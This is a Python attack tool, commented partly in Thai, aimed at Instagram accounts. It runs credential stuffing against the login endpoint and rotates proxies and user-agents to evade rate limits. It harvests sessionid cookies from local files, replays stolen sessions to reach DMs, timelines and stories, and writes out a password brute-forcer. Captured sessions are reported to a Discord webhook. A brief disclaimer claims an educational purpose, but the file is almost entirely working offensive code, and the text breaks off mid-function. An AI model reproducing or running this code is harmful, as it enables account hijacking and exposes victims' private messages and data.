#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀 REAL PENETRATION ATTACK MENU
🔥 3 Methods Ultimate Instagram Penetration System
By SugarGlitch - Dream Edition
"""

import os
import json
import requests
import time
import random
import threading
import glob
from datetime import datetime
import urllib.parse

def show_real_penetration_menu():
    """แสดงเมนู Real Penetration Attack"""
    print("💀 REAL PENETRATION ATTACK MENU")
    print("="*60)
    print("🔥 3 WORKING METHODS - INSTAGRAM PENETRATION:")
    print()
    print("1️⃣  � Advanced API Attack")
    print("    • Hit Instagram AJAX login endpoints")
    print("    • Proxy/User-Agent spoofing")
    print("    • SessionID extraction")
    print("    • CSRF token bypass")
    print()
    print("2️⃣  🔓 Session Hijack + InstagrAPI")
    print("    • Read sessionids from files/APIs/cookies")
    print("    • Test with instagrapi integration")
    print("    • Prove access: DMs/Posts/Stories")
    print("    • Validate stolen sessions")
    print()
    print("3️⃣  🎭 Session Replay Attack")
    print("    • Test sessionid validity")
    print("    • Send requests to IG with auth tokens")
    print("    • Session persistence testing")
    print("    • Multi-account session management")
    print()
    print("4️⃣  🌐 Proxy Rotation Manager")
    print("    • Bright Data integration")
    print("    • Auto proxy switching")
    print("    • Rate limit bypass")
    print()
    print("5️⃣  🔔 Discord Alert System")
    print("    • Real-time attack notifications")
    print("    • Success/failure alerts")
    print("    • Session capture logs")
    print()
    print("6️⃣  📊 Ultimate Results Dashboard")
    print("    • Show captured sessions")
    print("    • Export validated accounts")
    print("    • Attack success statistics")
    print()

class AdvancedAPIAttack:
    """🚀 Advanced API Attack - เจาะผ่าน Instagram AJAX endpoints"""
    
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.sessionid = None
        self.proxies = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        # Instagram AJAX endpoints
        self.login_endpoint = "https://www.instagram.com/accounts/login/ajax/"
        self.graphql_endpoint = "https://www.instagram.com/graphql/query/"
        self.challenge_endpoint = "https://www.instagram.com/challenge/"
        
    def setup_session(self):
        """Setup session with spoofing"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': '1',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
    def get_csrf_token(self):
        """ดึง CSRF token จาก Instagram"""
        try:
            print("� Extracting CSRF token...")
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            # Method 1: From cookies
            if 'csrftoken' in response.cookies:
                self.csrf_token = response.cookies['csrftoken']
                print(f"✅ CSRF Token (cookies): {self.csrf_token[:20]}...")
                return True
                
            # Method 2: From page content
            import re
            csrf_patterns = [
                r'"csrf_token":"([^"]+)"',
                r'csrf_token&quot;:&quot;([^&]+)&quot;',
                r'window._sharedData.*?"csrf_token":"([^"]+)"'
            ]
            
            for pattern in csrf_patterns:
                match = re.search(pattern, response.text)
                if match:
                    self.csrf_token = match.group(1)
                    print(f"✅ CSRF Token (regex): {self.csrf_token[:20]}...")
                    return True
                    
            print("⚠️ CSRF token not found, using bypass method")
            self.csrf_token = "missing"
            return True
            
        except Exception as e:
            print(f"❌ CSRF Error: {e}")
            return False
            
    def api_login_attack(self, username, password):
        """API Login Attack ผ่าน AJAX endpoint"""
        try:
            print(f"🚀 API Attack: {username}")
            
            # Setup headers
            self.setup_session()
            
            # Login payload
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            
            # Send API request
            response = self.session.post(
                self.login_endpoint,
                data=login_data,
                allow_redirects=False
            )
            
            print(f"📡 Response Status: {response.status_code}")
            
            # Extract sessionid from response
            if 'sessionid' in response.cookies:
                self.sessionid = response.cookies['sessionid']
                print(f"💎 SessionID Captured: {self.sessionid[:30]}...")
                
                # Save session
                self.save_captured_session(username, password, self.sessionid)
                return True
                
            # Check response for success indicators
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('authenticated'):
                        print("✅ Authentication successful!")
                        return True
                    elif 'checkpoint_url' in data:
                        print("🔒 Checkpoint required")
                        return False
                    else:
                        print(f"❌ Login failed: {data.get('message', 'Unknown error')}")
                except:
                    print("❌ Invalid JSON response")
                    
            return False
            
        except Exception as e:
            print(f"❌ API Attack Error: {e}")
            return False
            
    def save_captured_session(self, username, password, sessionid):
        """บันทึก session ที่ได้"""
        os.makedirs('captured_sessions', exist_ok=True)
        
        session_data = {
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'password': password,
            'sessionid': sessionid,
            'csrf_token': self.csrf_token,
            'user_agent': self.session.headers.get('User-Agent'),
            'method': 'api_attack'
        }
        
        filename = f"captured_sessions/session_{username}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(session_data, f, indent=4)
            
        print(f"💾 Session saved: {filename}")
        
    def run_attack(self, target_file):
        """รัน Advanced API Attack"""
        print("🚀 ADVANCED API ATTACK STARTING...")
        print("="*50)
        
        if not self.get_csrf_token():
            print("❌ Cannot get CSRF token")
            return
            
        if not os.path.exists(target_file):
            print(f"❌ Target file not found: {target_file}")
            return
            
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if ':' in line]
            
        print(f"🎯 Loaded {len(targets)} targets")
        
        success_count = 0
        for i, target in enumerate(targets, 1):
            username, password = target.split(':', 1)
            
            print(f"\n[{i}/{len(targets)}] Testing: {username}")
            
            if self.api_login_attack(username, password):
                success_count += 1
                print(f"✅ SUCCESS! ({success_count} total)")
            else:
                print("❌ Failed")
                
            # Rate limiting
            delay = random.randint(8, 20)
            print(f"⏳ Waiting {delay}s...")
            time.sleep(delay)
            
        print(f"\n🎉 Attack Complete! {success_count}/{len(targets)} successful")


class SessionHijacker:
    """🔓 Session Hijack + InstagrAPI Integration"""
    
    def __init__(self):
        self.captured_sessions = []
        self.instagrapi_client = None
        
    def scan_session_files(self):
        """สแกนหา sessionid จากไฟล์ต่างๆ"""
        print("🔍 Scanning for session files...")
        
        session_sources = [
            'captured_sessions/*.json',
            'logs/*.log',
            'cookies/*.txt',
            'browser_data/*.json',
            '*.json'
        ]
        
        import glob
        found_sessions = []
        
        for pattern in session_sources:
            files = glob.glob(pattern)
            for file in files:
                sessions = self.extract_sessions_from_file(file)
                found_sessions.extend(sessions)
                
        print(f"📦 Found {len(found_sessions)} potential sessions")
        return found_sessions
        
    def extract_sessions_from_file(self, filepath):
        """Extract sessionid จากไฟล์"""
        sessions = []
        try:
            with open(filepath, 'r') as f:
                content = f.read()
                
            # Regex patterns for sessionid
            import re
            patterns = [
                r'sessionid["\']?\s*[:=]\s*["\']?([a-zA-Z0-9%]+)',
                r'"sessionid":\s*"([^"]+)"',
                r'sessionid=([^;]+)',
                r'ig_sessionid["\']?\s*[:=]\s*["\']?([a-zA-Z0-9%]+)'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    if len(match) > 20:  # Valid sessionid length
                        sessions.append({
                            'sessionid': match,
                            'source': filepath,
                            'extracted_at': datetime.now().isoformat()
                        })
                        
        except Exception as e:
            print(f"⚠️ Error reading {filepath}: {e}")
            
        return sessions
        
    def test_session_with_instagrapi(self, sessionid):
        """ทดสอบ session ด้วย instagrapi"""
        try:
            print(f"🧪 Testing session with instagrapi: {sessionid[:20]}...")
            
            # Import instagrapi (install if needed)
            try:
                from instagrapi import Client
            except ImportError:
                print("📦 Installing instagrapi...")
                os.system('pip install instagrapi')
                from instagrapi import Client
                
            # Create client and login with session
            cl = Client()
            cl.set_settings({
                'sessionid': sessionid
            })
            
            # Test 1: Get own user info
            try:
                user_info = cl.account_info()
                username = user_info.username
                print(f"✅ Session valid! Username: {username}")
                
                # Test 2: Get DMs
                try:
                    threads = cl.direct_threads(amount=5)
                    print(f"📬 Can access {len(threads)} DM threads")
                except:
                    print("⚠️ Cannot access DMs")
                    
                # Test 3: Get timeline
                try:
                    timeline = cl.timeline_feed(amount=5)
                    print(f"� Can access timeline ({len(timeline)} posts)")
                except:
                    print("⚠️ Cannot access timeline")
                    
                # Test 4: Get stories
                try:
                    stories = cl.story_feed_timeline()
                    print(f"📺 Can access stories")
                except:
                    print("⚠️ Cannot access stories")
                    
                return {
                    'valid': True,
                    'username': username,
                    'sessionid': sessionid,
                    'capabilities': {
                        'dms': 'threads' in locals(),
                        'timeline': 'timeline' in locals(),
                        'stories': 'stories' in locals()
                    }
                }
                
            except Exception as e:
                print(f"❌ Session invalid: {e}")
                return {'valid': False, 'error': str(e)}
                
        except Exception as e:
            print(f"❌ Instagrapi test error: {e}")
            return {'valid': False, 'error': str(e)}
            
    def run_hijack(self):
        """รัน Session Hijack attack"""
        print("🔓 SESSION HIJACK + INSTAGRAPI STARTING...")
        print("="*50)
        
        # Scan for sessions
        found_sessions = self.scan_session_files()
        
        if not found_sessions:
            print("❌ No sessions found to hijack")
            return
            
        valid_sessions = []
        
        for i, session_data in enumerate(found_sessions, 1):
            sessionid = session_data['sessionid']
            source = session_data['source']
            
            print(f"\n[{i}/{len(found_sessions)}] Testing session from {source}")
            
            result = self.test_session_with_instagrapi(sessionid)
            
            if result.get('valid'):
                valid_sessions.append(result)
                print(f"✅ HIJACKED! Username: {result['username']}")
                
                # Save hijacked session
                self.save_hijacked_session(result)
            else:
                print("❌ Invalid session")
                
            time.sleep(2)  # Rate limiting
            
        print(f"\n🎉 Hijack Complete! {len(valid_sessions)} valid sessions")
        return valid_sessions
        
    def save_hijacked_session(self, session_data):
        """บันทึก hijacked session"""
        os.makedirs('hijacked_sessions', exist_ok=True)
        
        filename = f"hijacked_sessions/hijacked_{session_data['username']}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(session_data, f, indent=4)
            
        print(f"💾 Hijacked session saved: {filename}")


class SessionReplayAttack:
    """🎭 Session Replay Attack - ตรวจสอบ sessionid validity"""
    
    def __init__(self):
        self.session = requests.Session()
        self.replay_endpoints = [
            'https://www.instagram.com/api/v1/accounts/current_user/',
            'https://www.instagram.com/api/v1/feed/timeline/',
            'https://www.instagram.com/api/v1/direct_v2/inbox/',
            'https://www.instagram.com/api/v1/users/self/',
            'https://i.instagram.com/api/v1/accounts/current_user/'
        ]
        
    def test_sessionid_validity(self, sessionid, username=None):
        """ทดสอบความถูกต้องของ sessionid"""
        print(f"🎭 Testing SessionID: {sessionid[:25]}...")
        
        # Setup headers with sessionid
        self.session.cookies.update({'sessionid': sessionid})
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'application/json, text/plain, */*',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        valid_endpoints = []
        
        for endpoint in self.replay_endpoints:
            try:
                print(f"📡 Testing endpoint: {endpoint.split('/')[-2]}...")
                
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'user' in data or 'items' in data or 'inbox' in data:
                            valid_endpoints.append(endpoint)
                            print(f"✅ Valid response from {endpoint.split('/')[-2]}")
                        else:
                            print(f"⚠️ Unexpected response from {endpoint.split('/')[-2]}")
                    except:
                        print(f"❌ Invalid JSON from {endpoint.split('/')[-2]}")
                elif response.status_code == 401:
                    print(f"🔒 Unauthorized at {endpoint.split('/')[-2]}")
                else:
                    print(f"❌ Status {response.status_code} at {endpoint.split('/')[-2]}")
                    
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                print(f"❌ Error testing {endpoint}: {e}")
                
        is_valid = len(valid_endpoints) > 0
        
        result = {
            'sessionid': sessionid,
            'username': username,
            'valid': is_valid,
            'valid_endpoints': valid_endpoints,
            'tested_at': datetime.now().isoformat()
        }
        
        if is_valid:
            print(f"✅ SessionID is VALID! ({len(valid_endpoints)}/{len(self.replay_endpoints)} endpoints)")
            self.save_valid_session(result)
        else:
            print("❌ SessionID is INVALID")
            
        return result
        
    def load_sessions_to_test(self):
        """โหลด sessions ที่จะทดสอบ"""
        sessions_to_test = []
        
        # From captured sessions
        if os.path.exists('captured_sessions'):
            import glob
            for file in glob.glob('captured_sessions/*.json'):
                try:
                    with open(file, 'r') as f:
                        data = json.load(f)
                        sessions_to_test.append({
                            'sessionid': data.get('sessionid'),
                            'username': data.get('username'),
                            'source': file
                        })
                except Exception as e:
                    print(f"⚠️ Error loading {file}: {e}")
                    
        # From hijacked sessions
        if os.path.exists('hijacked_sessions'):
            for file in glob.glob('hijacked_sessions/*.json'):
                try:
                    with open(file, 'r') as f:
                        data = json.load(f)
                        sessions_to_test.append({
                            'sessionid': data.get('sessionid'),
                            'username': data.get('username'),
                            'source': file
                        })
                except Exception as e:
                    print(f"⚠️ Error loading {file}: {e}")
                    
        return sessions_to_test
        
    def save_valid_session(self, session_data):
        """บันทึก valid session"""
        os.makedirs('valid_sessions', exist_ok=True)
        
        username = session_data.get('username', 'unknown')
        filename = f"valid_sessions/valid_{username}_{int(time.time())}.json"
        
        with open(filename, 'w') as f:
            json.dump(session_data, f, indent=4)
            
        print(f"� Valid session saved: {filename}")
        
    def run_replay_attack(self):
        """รัน Session Replay Attack"""
        print("🎭 SESSION REPLAY ATTACK STARTING...")
        print("="*50)
        
        sessions_to_test = self.load_sessions_to_test()
        
        if not sessions_to_test:
            print("❌ No sessions found to test")
            return
            
        valid_count = 0
        
        for i, session_data in enumerate(sessions_to_test, 1):
            sessionid = session_data['sessionid']
            username = session_data.get('username', 'unknown')
            source = session_data['source']
            
            print(f"\n[{i}/{len(sessions_to_test)}] Replaying session from {source}")
            
            result = self.test_sessionid_validity(sessionid, username)
            
            if result['valid']:
                valid_count += 1
                
            # Rate limiting
            time.sleep(random.randint(3, 8))
            
        print(f"\n🎉 Replay Attack Complete! {valid_count}/{len(sessions_to_test)} valid sessions")


def run_advanced_api_attack():
    """รัน Advanced API Attack"""
    print("🚀 ADVANCED API ATTACK")
    print("="*30)
    
    target_file = input("📂 Target file (default: combined_targets.txt): ").strip()
    if not target_file:
        target_file = "combined_targets.txt"
        
    attacker = AdvancedAPIAttack()
    attacker.run_attack(target_file)

def run_session_hijack():
    """รัน Session Hijack Attack"""
    print("🔓 SESSION HIJACK + INSTAGRAPI")
    print("="*30)
    
    hijacker = SessionHijacker()
    hijacker.run_hijack()

def run_session_replay():
    """รัน Session Replay Attack"""
    print("🎭 SESSION REPLAY ATTACK")
    print("="*30)
    
    replay = SessionReplayAttack()
    replay.run_replay_attack()

def setup_proxy_rotation():
    """ตั้งค่า Proxy Rotation"""
    print("🌐 PROXY ROTATION MANAGER")
    print("="*30)
    
    # Check if proxy config exists
    proxy_files = ['proxy_config.json', 'proxy_config_new.json']
    proxy_config = None
    
    for file in proxy_files:
        if os.path.exists(file):
            with open(file, 'r') as f:
                proxy_config = json.load(f)
            print(f"✅ Loaded proxy config from {file}")
            break
            
    if not proxy_config:
        print("⚠️ No proxy config found, creating sample...")
        sample_config = {
            "brightdata": {
                "endpoint": "brd-customer-hl_12345678-zone-datacenter_proxy1:abc123@brd.superproxy.io:22225",
                "username": "brd-customer-hl_12345678-zone-datacenter_proxy1",
                "password": "abc123",
                "enabled": True
            },
            "rotation": {
                "interval": 300,
                "max_failures": 3,
                "test_url": "https://httpbin.org/ip"
            }
        }
        
        with open('proxy_rotation_config.json', 'w') as f:
            json.dump(sample_config, f, indent=4)
        print("💾 Created proxy_rotation_config.json")
        
    # Test proxy rotation
    test_proxy_rotation()

def test_proxy_rotation():
    """ทดสอบ Proxy Rotation"""
    print("🧪 Testing proxy rotation...")
    
    try:
        import requests
        
        # Test without proxy
        response = requests.get('https://httpbin.org/ip', timeout=10)
        original_ip = response.json()['origin']
        print(f"🌍 Original IP: {original_ip}")
        
        # Test with proxy (if available)
        if os.path.exists('proxy_config.json'):
            with open('proxy_config.json', 'r') as f:
                proxy_config = json.load(f)
                
            if proxy_config.get('brightdata', {}).get('enabled'):
                endpoint = proxy_config['brightdata']['endpoint']
                proxies = {
                    'http': f'http://{endpoint}',
                    'https': f'http://{endpoint}'
                }
                
                try:
                    response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=10)
                    proxy_ip = response.json()['origin']
                    print(f"🌐 Proxy IP: {proxy_ip}")
                    
                    if proxy_ip != original_ip:
                        print("✅ Proxy rotation working!")
                    else:
                        print("⚠️ Proxy not working properly")
                        
                except Exception as e:
                    print(f"❌ Proxy test failed: {e}")
                    
    except Exception as e:
        print(f"❌ Network test failed: {e}")

def setup_discord_alerts():
    """ตั้งค่า Discord Alert System"""
    print("🔔 DISCORD ALERT SYSTEM")
    print("="*30)
    
    webhook_url = input("🌐 Discord Webhook URL (optional): ").strip()
    
    if webhook_url:
        discord_config = {
            "webhook_url": webhook_url,
            "enabled": True,
            "alerts": {
                "session_captured": True,
                "attack_started": True,
                "attack_completed": True,
                "errors": True
            }
        }
        
        with open('discord_config.json', 'w') as f:
            json.dump(discord_config, f, indent=4)
            
        print("💾 Discord config saved")
        
        # Test webhook
        test_discord_webhook(webhook_url)
    else:
        print("⚠️ No webhook URL provided, skipping Discord alerts")

def test_discord_webhook(webhook_url):
    """ทดสอบ Discord Webhook"""
    try:
        import requests
        
        test_message = {
            "content": "🚀 SugarGlitch Real Penetration Attack System - Test Alert",
            "embeds": [{
                "title": "System Test",
                "description": "Discord alert system is working!",
                "color": 16711680,  # Red color
                "timestamp": datetime.now().isoformat(),
                "fields": [
                    {"name": "Status", "value": "✅ Active", "inline": True},
                    {"name": "Mode", "value": "Real Penetration", "inline": True}
                ]
            }]
        }
        
        response = requests.post(webhook_url, json=test_message, timeout=10)
        
        if response.status_code == 204:
            print("✅ Discord webhook test successful!")
        else:
            print(f"⚠️ Webhook test failed: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Discord test error: {e}")

def send_discord_alert(message, alert_type="info"):
    """ส่ง Discord Alert"""
    try:
        if not os.path.exists('discord_config.json'):
            return
            
        with open('discord_config.json', 'r') as f:
            config = json.load(f)
            
        if not config.get('enabled'):
            return
            
        webhook_url = config.get('webhook_url')
        if not webhook_url:
            return
            
        colors = {
            "success": 65280,  # Green
            "error": 16711680,  # Red
            "warning": 16776960,  # Yellow
            "info": 3447003  # Blue
        }
        
        discord_message = {
            "embeds": [{
                "title": f"🔥 SugarGlitch Alert - {alert_type.title()}",
                "description": message,
                "color": colors.get(alert_type, 3447003),
                "timestamp": datetime.now().isoformat(),
                "footer": {"text": "Real Penetration Attack System"}
            }]
        }
        
        requests.post(webhook_url, json=discord_message, timeout=5)
        
    except Exception as e:
        print(f"⚠️ Discord alert error: {e}")

def show_ultimate_results():
    """แสดงผลลัพธ์ Ultimate"""
    print("📊 ULTIMATE RESULTS DASHBOARD")
    print("="*50)
    
    # Count results
    results = {
        'captured_sessions': 0,
        'hijacked_sessions': 0,
        'valid_sessions': 0,
        'total_attacks': 0
    }
    
    # Count captured sessions
    if os.path.exists('captured_sessions'):
        import glob
        results['captured_sessions'] = len(glob.glob('captured_sessions/*.json'))
        
    # Count hijacked sessions  
    if os.path.exists('hijacked_sessions'):
        results['hijacked_sessions'] = len(glob.glob('hijacked_sessions/*.json'))
        
    # Count valid sessions
    if os.path.exists('valid_sessions'):
        results['valid_sessions'] = len(glob.glob('valid_sessions/*.json'))
        
    # Total attacks
    results['total_attacks'] = results['captured_sessions'] + results['hijacked_sessions']
    
    print(f"💎 Captured Sessions: {results['captured_sessions']}")
    print(f"🔓 Hijacked Sessions: {results['hijacked_sessions']}")
    print(f"✅ Valid Sessions: {results['valid_sessions']}")
    print(f"🎯 Total Attacks: {results['total_attacks']}")
    print()
    
    # Show recent sessions
    if results['valid_sessions'] > 0:
        print("🏆 RECENT VALID SESSIONS:")
        print("-" * 30)
        
        valid_files = glob.glob('valid_sessions/*.json')[-5:]  # Last 5
        
        for file in valid_files:
            try:
                with open(file, 'r') as f:
                    data = json.load(f)
                username = data.get('username', 'unknown')
                tested_at = data.get('tested_at', 'unknown')
                endpoints = len(data.get('valid_endpoints', []))
                
                print(f"👤 {username} | {endpoints} endpoints | {tested_at[:19]}")
                
            except Exception as e:
                print(f"⚠️ Error reading {file}: {e}")
                
    # Export options
    print("\n📤 EXPORT OPTIONS:")
    print("1. Export all valid sessions to CSV")
    print("2. Export attack statistics")
    print("3. Generate penetration report")
    
    export_choice = input("\n🎯 Export option (1-3, Enter to skip): ").strip()
    
    if export_choice == "1":
        export_sessions_csv()
    elif export_choice == "2":
        export_attack_stats()
    elif export_choice == "3":
        generate_penetration_report()

def export_sessions_csv():
    """Export sessions เป็น CSV"""
    try:
        import csv
        import glob
        
        csv_file = f"penetration_results_{int(time.time())}.csv"
        
        with open(csv_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Username', 'SessionID', 'Source', 'Valid_Endpoints', 'Tested_At'])
            
            # Export valid sessions
            for file in glob.glob('valid_sessions/*.json'):
                try:
                    with open(file, 'r') as jf:
                        data = json.load(jf)
                        
                    writer.writerow([
                        data.get('username', 'unknown'),
                        data.get('sessionid', '')[:30] + '...',
                        'session_replay',
                        len(data.get('valid_endpoints', [])),
                        data.get('tested_at', '')[:19]
                    ])
                except:
                    continue
                    
            # Export hijacked sessions
            for file in glob.glob('hijacked_sessions/*.json'):
                try:
                    with open(file, 'r') as jf:
                        data = json.load(jf)
                        
                    writer.writerow([
                        data.get('username', 'unknown'),
                        data.get('sessionid', '')[:30] + '...',
                        'session_hijack',
                        'instagrapi_verified',
                        datetime.now().isoformat()[:19]
                    ])
                except:
                    continue
                    
        print(f"💾 Sessions exported to {csv_file}")
        
    except Exception as e:
        print(f"❌ Export error: {e}")

def export_attack_stats():
    """Export attack statistics"""
    stats = {
        "attack_summary": {
            "timestamp": datetime.now().isoformat(),
            "tool": "SugarGlitch Real Penetration Attack System",
            "version": "Dream Edition v1.0"
        },
        "methods_used": [
            "Advanced API Attack",
            "Session Hijack + InstagrAPI", 
            "Session Replay Attack"
        ],
        "results": {
            "captured_sessions": len(glob.glob('captured_sessions/*.json')) if os.path.exists('captured_sessions') else 0,
            "hijacked_sessions": len(glob.glob('hijacked_sessions/*.json')) if os.path.exists('hijacked_sessions') else 0,
            "valid_sessions": len(glob.glob('valid_sessions/*.json')) if os.path.exists('valid_sessions') else 0
        }
    }
    
    stats_file = f"attack_statistics_{int(time.time())}.json"
    with open(stats_file, 'w') as f:
        json.dump(stats, f, indent=4)
        
    print(f"📊 Statistics exported to {stats_file}")

def generate_penetration_report():
    """Generate penetration testing report"""
    report = f"""
# 💀 REAL PENETRATION ATTACK REPORT
**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Tool:** SugarGlitch Real Penetration Attack System - Dream Edition

## 🎯 Attack Methods Executed

### 1. 🚀 Advanced API Attack
- Direct Instagram AJAX endpoint attacks
- CSRF token extraction and bypass
- Proxy/User-Agent spoofing
- SessionID extraction from responses

### 2. 🔓 Session Hijack + InstagrAPI  
- Session file scanning and extraction
- InstagrAPI integration for validation
- DMs/Posts/Stories access testing
- Stolen session verification

### 3. 🎭 Session Replay Attack
- SessionID validity testing
- Multi-endpoint authentication testing
- Session persistence verification
- Auth token replay attacks

## 📊 Results Summary
"""
    
    # Add results
    if os.path.exists('captured_sessions'):
        captured = len(glob.glob('captured_sessions/*.json'))
        report += f"- **Captured Sessions:** {captured}\n"
        
    if os.path.exists('hijacked_sessions'):
        hijacked = len(glob.glob('hijacked_sessions/*.json'))
        report += f"- **Hijacked Sessions:** {hijacked}\n"
        
    if os.path.exists('valid_sessions'):
        valid = len(glob.glob('valid_sessions/*.json'))
        report += f"- **Valid Sessions:** {valid}\n"
        
    report += f"""
## 🛡️ Security Recommendations
1. Implement stronger session management
2. Use proper CSRF protection
3. Monitor for suspicious API calls
4. Implement rate limiting
5. Use device fingerprinting

## ⚠️ Disclaimer
This tool is for educational and authorized penetration testing only.
Unauthorized access to computer systems is illegal.

---
*Generated by SugarGlitch Real Penetration Attack System*
"""
    
    report_file = f"penetration_report_{int(time.time())}.md"
    with open(report_file, 'w') as f:
        f.write(report)
        
    print(f"📋 Penetration report generated: {report_file}")

def create_simple_stealth_hacker():
    """สร้าง Simple Stealth Hacker สำหรับการใช้งานง่าย"""
    print("🛠️ CREATING SIMPLE STEALTH HACKER")
    print("="*40)
    
    simple_code = '''#!/usr/bin/env python3
"""🛠️ Simple Stealth Hacker - ฟังก์ชันการโจมตีแบบง่าย"""

import requests
import json
import time
import random
from datetime import datetime
import os

class SimpleStealthHacker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
    def get_csrf_token(self):
        """ดึง CSRF token"""
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/')
            if 'csrftoken' in response.cookies:
                self.csrf_token = response.cookies['csrftoken']
                print(f"✅ CSRF: {self.csrf_token[:15]}...")
                return True
        except:
            pass
        return False
    
    def try_login(self, username, password):
        """ลองล็อกอิน"""
        try:
            print(f"🎯 ลอง: {username} | {password}")
            
            # Rate limiting protection
            delay = random.uniform(8, 15)
            print(f"⏰ รอ {delay:.1f} วินาที...")
            time.sleep(delay)
            
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = self.headers.copy()
            if self.csrf_token:
                headers['X-CSRFToken'] = self.csrf_token
            headers['X-Requested-With'] = 'XMLHttpRequest'
            headers['Referer'] = 'https://www.instagram.com/accounts/login/'
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=15
            )
            
            result = {
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'timestamp': datetime.now().isoformat(),
                'success': False
            }
            
            if response.status_code == 429:
                print("❌ Rate limited! ต้องหยุดพัก...")
                result['error'] = 'Rate limited'
                return result
            
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    if json_response.get('authenticated'):
                        print("🎉 SUCCESS!")
                        result['success'] = True
                        result['session_data'] = dict(self.session.cookies)
                        
                        # Save success
                        self.save_success(result)
                        
                    else:
                        print("❌ Invalid credentials")
                        result['error'] = 'Invalid credentials'
                        
                except:
                    print("❌ Invalid response")
                    result['error'] = 'Invalid response'
            else:
                print(f"❌ HTTP {response.status_code}")
                result['error'] = f'HTTP {response.status_code}'
            
            return result
            
        except Exception as e:
            print(f"❌ Error: {e}")
            return {'username': username, 'password': password, 'success': False, 'error': str(e)}
    
    def save_success(self, result):
        """บันทึกผลสำเร็จ"""
        try:
            import os
            os.makedirs('output', exist_ok=True)
            
            filename = f"output/simple_success_{result['username']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(result, f, indent=2)
            
            print(f"💾 บันทึกผลสำเร็จ: {filename}")
            
        except Exception as e:
            print(f"❌ ไม่สามารถบันทึกได้: {e}")
    
    def start_attack(self):
        """เริ่มการโจมตี"""
        print("🛠️ SIMPLE STEALTH HACKER")
        print("="*40)
        
        # Get CSRF token
        if not self.get_csrf_token():
            print("⚠️ ไม่สามารถดึง CSRF token ได้ แต่ยังดำเนินการต่อได้")
        
        # Get target
        username = input("🎯 Enter username: ").strip()
        if not username:
            print("❌ Username required!")
            return
        
        # Load passwords
        password_file = input("📂 Password file (default: whatilove1728.txt): ").strip()
        if not password_file:
            password_file = "whatilove1728.txt"
        
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"✅ โหลด {len(passwords)} passwords")
        except:
            print("❌ ไม่พบไฟล์ passwords")
            return
        
        # Start attack
        print("\\n🚀 เริ่มการโจมตี...")
        
        for i, password in enumerate(passwords, 1):
            print(f"\\n[{i}/{len(passwords)}]")
            result = self.try_login(username, password)
            
            if result['success']:
                print("🎉 พบรหัสผ่าน!")
                cont = input("ต้องการทดสอบต่อไหม? (y/n): ")
                if cont.lower() != 'y':
                    break
            
            # Break on rate limit
            if result.get('error') == 'Rate limited':
                print("💤 หยุดเนื่องจาก rate limit")
                break

if __name__ == "__main__":
    hacker = SimpleStealthHacker()
    hacker.start_attack()
'''
    
    with open('simple_stealth_hacker.py', 'w') as f:
        f.write(simple_code)
    
    print("✅ สร้าง simple_stealth_hacker.py เสร็จแล้ว!")
    print("🚀 รัน: python simple_stealth_hacker.py")

def quick_fix_mode():
    """โหมดแก้ไขปัญหาเร่งด่วน"""
    print("🔧 QUICK FIX MODE")
    print("="*30)
    
    print("🔍 ตรวจสอบปัญหาและแก้ไข...")
    
    # Check files
    files_to_check = [
        'whatilove1728.txt',
        'brute_config.json',
        'ultimate_csrf_chrome_fix.py'
    ]
    
    for file in files_to_check:
        if os.path.exists(file):
            print(f"✅ {file}")
        else:
